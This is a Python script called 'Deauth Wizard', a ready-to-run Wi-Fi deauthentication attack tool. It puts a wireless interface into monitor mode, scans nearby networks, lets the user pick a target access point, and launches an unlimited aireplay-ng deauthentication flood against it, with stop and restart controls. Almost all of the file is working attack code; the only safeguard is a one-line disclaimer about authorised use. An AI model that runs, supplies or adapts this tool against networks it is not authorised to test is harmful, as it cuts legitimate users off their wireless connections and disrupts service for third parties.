#!/usr/bin/env python3

import os
import sys
import time
import signal
import subprocess
import logging
from typing import Dict, List, Optional

logging.basicConfig(level=logging.INFO, format="%(message)s")

COLOR_ENABLED = sys.stdout.isatty()
COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
COLOR_WARNING = "\033[33m" if COLOR_ENABLED else ""
STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""

# Global attack process variable
ATTACK_PROCESS: Optional[subprocess.Popen] = None


def color_text(text: str, color: str) -> str:
    return f"{color}{text}{COLOR_RESET}" if color else text


def style(text: str, *styles: str) -> str:
    prefix = "".join(s for s in styles if s)
    return f"{prefix}{text}{COLOR_RESET}" if prefix else text


def print_header(title: str, subtitle: Optional[str] = None) -> None:
    logging.info(color_text(title, COLOR_HEADER))
    if subtitle:
        logging.info(subtitle)
    logging.info("")


def prompt_int(prompt: str, default: int, minimum: int = 1) -> int:
    raw = input(prompt).strip()
    if not raw:
        return default
    try:
        value = int(raw)
    except ValueError:
        return default
    if value < minimum:
        return minimum
    return value


def list_network_interfaces() -> List[str]:
    interfaces: List[str] = []
    ip_link = subprocess.run(["ip", "-o", "link", "show"], stdout=subprocess.PIPE, text=True, check=False)
    for line in ip_link.stdout.splitlines():
        if ": " in line:
            name = line.split(": ", 1)[1].split(":", 1)[0]
            if name and name != "lo":
                interfaces.append(name)
    return interfaces


def get_interface_chipset(interface: str) -> str:
    try:
        result = subprocess.run(
            ["ethtool", "-i", interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return "unknown"

    if result.returncode != 0:
        return "unknown"

    driver = None
    bus_info = None
    for line in result.stdout.splitlines():
        if line.startswith("driver:"):
            driver = line.split(":", 1)[1].strip()
        if line.startswith("bus-info:"):
            bus_info = line.split(":", 1)[1].strip()

    if driver and bus_info and bus_info != "":
        return f"{driver} ({bus_info})"
    if driver:
        return driver
    return "unknown"


def select_interface(interfaces: List[str]) -> str:
    if not interfaces:
        logging.error("No network interfaces found.")
        sys.exit(1)

    logging.info("")
    logging.info(style("Available interfaces:", STYLE_BOLD))
    for index, name in enumerate(interfaces, start=1):
        chipset = get_interface_chipset(name)
        label = f"{index}) {name} -"
        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)

    while True:
        choice = input(f"{style('Select interface', STYLE_BOLD)} (number or name): ").strip()
        if not choice:
            logging.warning("Please select an interface.")
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(interfaces):
                return interfaces[idx - 1]
        if choice in interfaces:
            return choice
        logging.warning("Invalid selection. Try again.")


def get_interface_mode(interface: str) -> Optional[str]:
    result = subprocess.run(
        ["iw", "dev", interface, "info"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        return None
    for raw_line in result.stdout.splitlines():
        line = raw_line.strip()
        if line.startswith("type "):
            parts = line.split()
            if len(parts) >= 2:
                return parts[1]
    return None


def is_monitor_mode(interface: str) -> bool:
    return get_interface_mode(interface) == "monitor"


def set_interface_type(interface: str, mode: str) -> bool:
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
        result = subprocess.run(
            ["iw", "dev", interface, "set", "type", mode],
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )
        if result.returncode != 0:
            logging.error("Failed to set %s mode: %s", mode, result.stderr.strip() or "unknown error")
            return False
        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
        time.sleep(0.5)
        return True
    except Exception as exc:
        logging.error("Failed to set %s mode: %s", mode, exc)
        return False


def restore_managed_mode(interface: str) -> None:
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["iw", "dev", interface, "set", "type", "managed"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def freq_to_channel(freq: float) -> Optional[int]:
    if 2412 <= freq <= 2472:
        return int((freq - 2407) // 5)
    if freq == 2484:
        return 14
    if 5000 <= freq <= 5825:
        return int((freq - 5000) // 5)
    return None


def parse_channel_value(text: str) -> Optional[int]:
    try:
        return int(text)
    except (TypeError, ValueError):
        return None


def parse_freq_value(text: str) -> Optional[float]:
    try:
        value = float(text)
    except (TypeError, ValueError):
        return None
    if value > 100000:
        value /= 1000.0
    return value


def scan_wireless_networks(
    interface: str,
    duration_seconds: int = 15,
    show_progress: bool = False,
) -> List[Dict[str, Optional[str]]]:
    def run_scan() -> subprocess.CompletedProcess:
        return subprocess.run(
            ["iw", "dev", interface, "scan"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )

    end_time = time.time() + max(1, duration_seconds)
    networks: Dict[str, Dict[str, Optional[str]]] = {}
    last_remaining = None
    while time.time() < end_time:
        if show_progress and COLOR_ENABLED:
            remaining = max(0, int(end_time - time.time()))
            if remaining != last_remaining:
                last_remaining = remaining
                message = (
                    f"{style('Scanning', STYLE_BOLD)}... "
                    f"{style(str(remaining), COLOR_SUCCESS, STYLE_BOLD)}s remaining"
                )
                sys.stdout.write("\r" + message)
                sys.stdout.flush()
        try:
            result = run_scan()
        except FileNotFoundError:
            logging.error("Required tool 'iw' not found!")
            if show_progress and COLOR_ENABLED:
                sys.stdout.write("\n")
            return []

        if result.returncode != 0 and is_monitor_mode(interface):
            if set_interface_type(interface, "managed"):
                result = run_scan()
                if not set_interface_type(interface, "monitor"):
                    logging.error("Failed to restore monitor mode after scan.")

        if result.returncode != 0:
            logging.error("Wireless scan failed: %s", result.stderr.strip() or "unknown error")
            if show_progress and COLOR_ENABLED:
                sys.stdout.write("\n")
            return []

        current: Dict[str, Optional[str]] = {}
        for raw_line in result.stdout.splitlines():
            line = raw_line.strip()
            if line.startswith("BSS "):
                if current.get("bssid") and current.get("ssid"):
                    existing = networks.get(current["bssid"])
                    if existing is None or (
                        current.get("signal") is not None
                        and (existing.get("signal") is None or current["signal"] > existing["signal"])
                    ):
                        networks[current["bssid"]] = current
                current = {"bssid": line.split()[1].split("(")[0], "ssid": None, "signal": None, "channel": None}
                continue
            if line.startswith("freq:"):
                parts = line.split()
                freq_val = parse_freq_value(parts[1]) if len(parts) > 1 else None
                current["channel"] = freq_to_channel(freq_val) if freq_val is not None else None
                continue
            if line.startswith("DS Parameter set:"):
                parts = line.split()
                if len(parts) >= 4 and parts[-2] == "channel":
                    channel_val = parse_channel_value(parts[-1])
                    if channel_val is not None:
                        current["channel"] = channel_val
                continue
            if line.startswith("* primary channel:"):
                parts = line.split(":")
                if len(parts) == 2:
                    channel_val = parse_channel_value(parts[1].strip())
                    if channel_val is not None:
                        current["channel"] = channel_val
                continue
            if line.startswith("signal:"):
                parts = line.split()
                try:
                    current["signal"] = float(parts[1])
                except (IndexError, ValueError):
                    current["signal"] = None
                continue
            if line.startswith("SSID:"):
                ssid_val = line.split(":", 1)[1].strip()
                current["ssid"] = ssid_val if ssid_val else "<hidden>"

        if current.get("bssid") and current.get("ssid"):
            existing = networks.get(current["bssid"])
            if existing is None or (
                current.get("signal") is not None
                and (existing.get("signal") is None or current["signal"] > existing["signal"])
            ):
                networks[current["bssid"]] = current

        time.sleep(0.2)

    if show_progress and COLOR_ENABLED:
        sys.stdout.write("\n")

    sorted_networks = sorted(
        networks.values(),
        key=lambda item: item["signal"] if item["signal"] is not None else -1000,
        reverse=True,
    )
    return sorted_networks


def select_network(attack_interface: str, duration_seconds: int) -> Dict[str, Optional[str]]:
    while True:
        networks = scan_wireless_networks(attack_interface, duration_seconds, show_progress=True)
        if not networks:
            logging.warning("No networks found during scan.")
            retry = input(f"{style('Rescan', STYLE_BOLD)}? (Y/N): ").strip().lower()
            if retry == "y":
                continue
            sys.exit(1)

        logging.info("")
        logging.info(style("Available networks:", STYLE_BOLD))
        for index, net in enumerate(networks, start=1):
            signal = f"{net['signal']:.1f} dBm" if net["signal"] is not None else "signal unknown"
            channel = f"ch {net['channel']}" if net["channel"] else "ch ?"
            label = f"{index}) {net['ssid']} ({net['bssid']}) -"
            logging.info("  %s %s %s", color_text(label, COLOR_HIGHLIGHT), channel, signal)

        choice = input(
            f"{style('Select network', STYLE_BOLD)} (number, or R to rescan): "
        ).strip().lower()
        if choice == "r":
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(networks):
                return networks[idx - 1]
        logging.warning("Invalid selection. Try again.")


SELECTED_INTERFACE: Optional[str] = None


def cleanup() -> None:
    if SELECTED_INTERFACE:
        restore_managed_mode(SELECTED_INTERFACE)
    stop_attack()


def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> bool:
    global ATTACK_PROCESS
    bssid = target["bssid"]
    channel = target["channel"]
    if not bssid:
        logging.error("Missing target BSSID; cannot start attack.")
        return False

    if channel:
        subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stderr=subprocess.DEVNULL)

    try:
        ATTACK_PROCESS = subprocess.Popen(
            ["aireplay-ng", "-0", "0", "-a", bssid, interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
            text=True,
            preexec_fn=os.setsid,
        )
    except FileNotFoundError:
        logging.error("Required tool 'aireplay-ng' not found!")
        return False
    except Exception as exc:
        logging.error("Failed to start deauth attack: %s", exc)
        return False

    time.sleep(1)
    if ATTACK_PROCESS.poll() is not None:
        err_output = ATTACK_PROCESS.stderr.read().strip() if ATTACK_PROCESS.stderr else "unknown error"
        logging.error("Deauth process exited early: %s", err_output or "unknown error")
        ATTACK_PROCESS = None
        return False

    return True


def stop_attack() -> None:
    global ATTACK_PROCESS
    if ATTACK_PROCESS and ATTACK_PROCESS.poll() is None:
        try:
            try:
                pgid = os.getpgid(ATTACK_PROCESS.pid)
            except Exception:
                pgid = None
            if pgid is not None:
                try:
                    os.killpg(pgid, signal.SIGTERM)
                except Exception:
                    ATTACK_PROCESS.terminate()
            else:
                ATTACK_PROCESS.terminate()
            ATTACK_PROCESS.wait(timeout=3)
        except subprocess.TimeoutExpired:
            try:
                if pgid is not None:
                    os.killpg(pgid, signal.SIGKILL)
                else:
                    ATTACK_PROCESS.kill()
            except Exception:
                try:
                    ATTACK_PROCESS.kill()
                except Exception:
                    pass
        except Exception:
            pass
        try:
            for _ in range(5):
                if ATTACK_PROCESS.poll() is not None:
                    break
                time.sleep(0.2)
        except Exception:
            pass
    ATTACK_PROCESS = None


def run_deauth_session() -> bool:
    global SELECTED_INTERFACE

    interfaces = list_network_interfaces()
    SELECTED_INTERFACE = select_interface(interfaces)

    logging.info("")
    input(f"{style('Press Enter', STYLE_BOLD)} to switch {SELECTED_INTERFACE} to monitor mode...")
    if not set_interface_type(SELECTED_INTERFACE, "monitor"):
        return False
    logging.info("Monitor mode confirmed on %s.", SELECTED_INTERFACE)

    logging.info("")
    scan_seconds = prompt_int(
        f"{style('Scan duration', STYLE_BOLD)} in seconds "
        f"({style('Enter', STYLE_BOLD)} for {style('15', COLOR_SUCCESS, STYLE_BOLD)}): ",
        default=15,
    )

    logging.info("")
    input(f"{style('Press Enter', STYLE_BOLD)} to scan networks on {SELECTED_INTERFACE}...")
    target_network = select_network(SELECTED_INTERFACE, scan_seconds)
    logging.info("")
    logging.info(
        "Target selected: %s (%s)",
        style(target_network["ssid"], COLOR_SUCCESS, STYLE_BOLD),
        target_network["bssid"],
    )

    if not is_monitor_mode(SELECTED_INTERFACE):
        logging.warning("Interface left monitor mode; re-enabling.")
        if not set_interface_type(SELECTED_INTERFACE, "monitor"):
            return False

    logging.info("")
    logging.info(style("Starting deauthentication attack...", COLOR_WARNING, STYLE_BOLD))
    
    if not start_deauth_attack(SELECTED_INTERFACE, target_network):
        logging.error("Failed to start deauth attack.")
        return False
    
    logging.info("Deauth attack running. Press Ctrl+C or select an option below to stop.")
    logging.info("")
    
    while True:
        try:
            choice = input(
                f"{style('Stop attack', STYLE_BOLD)} (S), {style('back to main menu', STYLE_BOLD)} (B), "
                f"or {style('restart', STYLE_BOLD)} (R): "
            ).strip().lower()
            
            if choice in {"s", "stop"}:
                stop_attack()
                logging.info("Attack stopped.")
                logging.info("")
                break
            elif choice in {"b", "back"}:
                stop_attack()
                return False
            elif choice in {"r", "restart"}:
                stop_attack()
                return True
            else:
                logging.warning("Please enter S, B, or R.")
        except KeyboardInterrupt:
            stop_attack()
            logging.info("\nAttack stopped by user.")
            logging.info("")
            break
    
    return False


def main() -> None:
    print_header("Deauth Wizard", "Wi-Fi Deauthentication Attack Tool")

    if os.geteuid() != 0:
        logging.error("This script must be run as root!")
        sys.exit(1)

    required_tools = ["iw", "ip", "ethtool", "aireplay-ng"]
    for tool in required_tools:
        if subprocess.run(["which", tool], stdout=subprocess.DEVNULL).returncode != 0:
            logging.error("Required tool '%s' not found!", tool)
            sys.exit(1)

    import atexit
    atexit.register(cleanup)

    while True:
        logging.info(style("Disclaimer:", STYLE_BOLD))
        logging.info(
            "Only test on networks and devices you own or have explicit permission to use."
        )
        logging.info("")
        restart = run_deauth_session()
        if not restart:
            break
        logging.info(color_text("Restarting deauth wizard...\n", COLOR_HEADER))


if __name__ == "__main__":
    main()